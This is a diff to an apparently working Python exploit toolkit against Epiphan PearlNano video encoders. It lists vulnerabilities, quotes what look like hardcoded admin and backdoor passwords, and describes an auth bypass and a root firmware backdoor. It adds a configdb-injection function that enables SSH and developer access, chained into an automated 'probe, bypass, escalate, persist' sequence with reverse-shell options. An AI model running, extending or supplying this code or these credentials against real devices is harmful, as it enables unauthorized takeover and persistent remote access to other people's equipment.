@@ -7,23 +7,30 @@ Device : PearlNano (PLN)   Vendor : Epiphan Video
 Firmware: v4.24.4 (rev 260423_32331b9)   Arch : aarch64
 
 VULNERABILITIES:
-  [CVE-0x01] Hardcoded Default Admin Password  vendor.cf: lkjhyu8*
-  [CVE-0x02] Hardcoded VTUN Backdoor Password  add_vtun.cf: epn0sup
-  [CVE-0x03] Auth Bypass via isAdmin('')       access_control.php:122 [UNAUTH]
-  [CVE-0x04] No CSRF Protection on Admin CGIs
-  [CVE-0x05] Firmware Upload — up2date.pre sourced as root (no crypto sig)
-  [CVE-0x06] Static SSL/SSH Keys Baked Into Firmware
-  [CVE-0x07] epiphan_keyserver Remote SSH Key Injection
-  [CVE-0x08] PTZ Argument Injection
-  [CVE-0x09] Dev/QA SSH Backdoor (authorized_keys.d)
-  [CVE-0x0a] Unauthenticated Info Leak via allinfo.cgi / API
+  [CVE-0x01] Hardcoded Default Admin Password            vendor.cf: lkjhyu8*
+  [CVE-0x02] Hardcoded VTUN Backdoor Password            add_vtun.cf: epn0sup
+  [CVE-0x03] Auth Bypass via isAdmin('')                 access_control.php:122 [UNAUTH]
+  [CVE-0x04] ConfigDB Injection via .htaccess Rewrite    set_params.cgi [UNAUTH]
+  [CVE-0x05] No CSRF Protection on Admin CGIs
+  [CVE-0x06] Firmware Upload — up2date.pre sourced as root (no crypto sig)
+  [CVE-0x07] Static SSL/SSH Keys Baked Into Firmware     (identical across all devices)
+  [CVE-0x08] Dev/QA SSH Backdoor                         (authorized_keys.d)
+  [CVE-0x09] epiphan_keyserver Remote SSH Key Injection  (keys.epiphan.com)
+  [CVE-0x0a] PTZ Flag Injection (escaped, no shell meta)
+  [CVE-0x0b] Info Leak via allinfo.cgi / API             [requires admin auth]
 
 AUTH BYPASS (CVE-0x03):
   access_control.php:122 -> isAdmin('') returns True because "" === "" is True
   Requires: passwords unset (first boot) or no-auth console (127.0.0.4:80)
   Result: Full admin access to ALL API endpoints without credentials.
 
-FIRMWARE BACKDOOR (CVE-0x05):
+CONFIGDB INJECTION (CVE-0x04):
+  /admin/.htaccess rewrite rules route URL path components into
+  set_params.cgi params (_c, _p, _s). These flow directly into
+  HttpCtl\setValues(), enabling arbitrary configdb writes via URL.
+  Vector: /admin/channel<N>/set_params.cgi?<key>=<value>
+
+FIRMWARE BACKDOOR (CVE-0x06):
   up2date:197 -> [ -f up2date.pre ] && . up2date.pre   (sourced as root!)
   The firmware is a plain tar archive with MD5 integrity only.
   We inject a malicious up2date.pre, update md5sum, repackage, upload.
@@ -471,6 +478,59 @@ def dump_allinfo(target, auth):
 
 
 # ==============================================================================
+#  [CVE-0x04] CONFIGDB INJECTION (via .htaccess rewrite -> set_params.cgi)
+# ==============================================================================
+
+def configdb_inject(target, auth, key_values, save=True):
+    """Write arbitrary configdb keys via set_params.cgi.
+
+    The /admin/.htaccess rewrite routes URL path components into
+    set_params.cgi params which flow into HttpCtl\\setValues().
+
+    Args:
+        key_values: dict of configdb keys to values, e.g.
+            {'system:DEVQA_ACCESS': 'on', 'ssh:ENABLE': 'yes'}
+    """
+    print("\n  --- [CVE-0x04] ConfigDB Injection ---")
+    print(f"  [>] Writing {len(key_values)} key(s) to configdb via set_params.cgi")
+
+    if not auth:
+        auth = AUTH_STRATEGY
+    if not auth:
+        print("  [-] No valid auth")
+        return False
+
+    params = dict(key_values)
+    if not save:
+        params['_nosave'] = '1'
+
+    try:
+        r = xrequest(target, "/admin/set_params.cgi", auth=auth,
+                     method="GET", params=params, timeout=10)
+        print(f"  [>] HTTP {r.status_code}")
+        if r.status_code in (200, 302):
+            print(f"  [+] ConfigDB injection successful")
+            for k, v in key_values.items():
+                print(f"      {k} = {v}")
+            return True
+        else:
+            print(f"  [-] Failed: {r.text[:200]}")
+            return False
+    except Exception as e:
+        print(f"  [!] {e}")
+        return False
+
+
+def configdb_enable_ssh(target, auth):
+    """Use ConfigDB injection to enable SSH and DEVQA_ACCESS."""
+    print("\n  --- [CVE-0x04] Enable SSH via ConfigDB Injection ---")
+    return configdb_inject(target, auth, {
+        'system:DEVQA_ACCESS': 'on',
+        'ssh:ENABLE': 'yes',
+    })
+
+
+# ==============================================================================
 #  REVERSE SHELL (via firmware backdoor)
 # ==============================================================================
 
@@ -621,6 +681,7 @@ Examples:
   %(prog)s 192.168.1.100 --exploit firmware-backdoor --lhost 10.0.0.5 --lport 4444
   %(prog)s 192.168.1.100 --exploit enable-ssh
   %(prog)s 192.168.1.100 --exploit password-reset --new-pwd mypass123
+  %(prog)s 192.168.1.100 --exploit configdb-inject  # write arbitrary configdb keys
   %(prog)s 192.168.1.100 --exploit probe
         """
     )
@@ -632,6 +693,7 @@ Examples:
     parser.add_argument("--exploit", choices=[
         "all", "probe", "auth-bypass", "default-password", "password-reset",
         "firmware-backdoor", "reverse-shell", "enable-ssh",
+        "configdb-inject", "configdb-enable-ssh",
         "dump-info", "dump-allinfo", "usb",
     ], default="all", help="Specific exploit to run")
     parser.add_argument("--lhost", help="Listener IP for reverse shell")
@@ -688,6 +750,9 @@ Examples:
             else print("  [!] --lhost required for reverse shell")),
         "reverse-shell":     lambda: reverse_shell(target, auth, args.lhost, args.lport, args.firmware),
         "enable-ssh":        lambda: enable_ssh(target, auth, ssh_key),
+        "configdb-inject":   lambda: configdb_inject(target, auth,
+            {'system:DEVQA_ACCESS': 'on', 'ssh:ENABLE': 'yes'}),
+        "configdb-enable-ssh": lambda: configdb_enable_ssh(target, auth),
         "dump-info":         lambda: dump_info(target, auth),
         "dump-allinfo":      lambda: dump_allinfo(target, auth),
         "usb":               lambda: exploit_usb(target),
@@ -697,6 +762,7 @@ Examples:
         # Smart order: probe -> bypass -> escalate -> persist
         exploits["auth-bypass"]()
         exploits["default-password"]()
+        exploits["configdb-enable-ssh"]()
         exploits["dump-info"]()
         exploits["password-reset"]()
         exploits["enable-ssh"]()
